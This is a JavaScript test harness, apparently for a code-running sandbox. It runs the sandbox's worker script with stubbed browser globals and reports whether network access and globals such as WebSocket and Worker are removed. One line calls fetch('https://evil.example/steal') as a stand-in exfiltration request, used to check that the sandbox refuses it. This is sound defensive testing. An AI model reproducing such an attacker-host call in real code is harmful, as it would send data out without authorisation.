// Runs the sandbox's worker (public/sandbox/worker.js) in a process of its own with the globals of a worker, because the first thing it does is
// to take the network and other globals away for good. A scenario comes in BOOT_SCENARIO: { messages: [...] }. What the worker posted and what its
// globals look like afterwards are printed as one line of JSON.
import { pathToFileURL } from 'node:url';

const scenario = JSON.parse(process.env.BOOT_SCENARIO || '{}');
const posted = [];
const listeners = [];
const fetched = [];
globalThis.location = new URL('https://run.noureon.com/sandbox/worker.js');
globalThis.postMessage = (message) => { posted.push(message); };
globalThis.addEventListener = (type, listener) => { if (type === 'message') listeners.push(listener); };
// The network the worker would have had: it only records what reaches it, and fails.
globalThis.fetch = async (input) => { fetched.push(String(input?.url || input)); throw new TypeError('the network is not there'); };
globalThis.XMLHttpRequest = class {};
globalThis.WebSocket = class {};
globalThis.EventSource = class {};
globalThis.BroadcastChannel = class {};
globalThis.Worker = class {};
globalThis.indexedDB = {};
globalThis.caches = {};
globalThis.importScripts = () => {};

await import(pathToFileURL(new URL('../../../public/sandbox/worker.js', import.meta.url).pathname).href);

const send = async (data) => {
  for (const listener of listeners) await listener({ data });
};
// (`codeLength` stands for code of that many characters: a long value does not fit in the environment.)
for (const { codeLength, ...message } of scenario.messages || []) await send(codeLength ? { ...message, code: 'x'.repeat(codeLength) } : message);

let refused = null;
try { await globalThis.fetch('https://evil.example/steal'); } catch (error) { refused = String(error.message); }
let allowedReached = null;
try { await globalThis.fetch('https://run.noureon.com/sandbox/pyodide/pyodide-lock.json'); } catch (error) { allowedReached = String(error.message); }
const descriptor = Object.getOwnPropertyDescriptor(globalThis, 'fetch');
let reassigned = 'allowed';
try { 'use strict'; globalThis.fetch = () => {}; reassigned = globalThis.fetch === descriptor.value ? 'ignored' : 'changed'; } catch { reassigned = 'threw'; }
console.log(`REPORT ${JSON.stringify({
  posted,
  fetched,
  refused,
  allowedReached,
  reassigned,
  fetchWritable: descriptor.writable,
  fetchConfigurable: descriptor.configurable,
  removed: Object.fromEntries(['XMLHttpRequest', 'WebSocket', 'EventSource', 'BroadcastChannel', 'Worker', 'importScripts', 'indexedDB', 'caches'].map((name) => [name, typeof globalThis[name]]))
})}`);
process.exit(0);
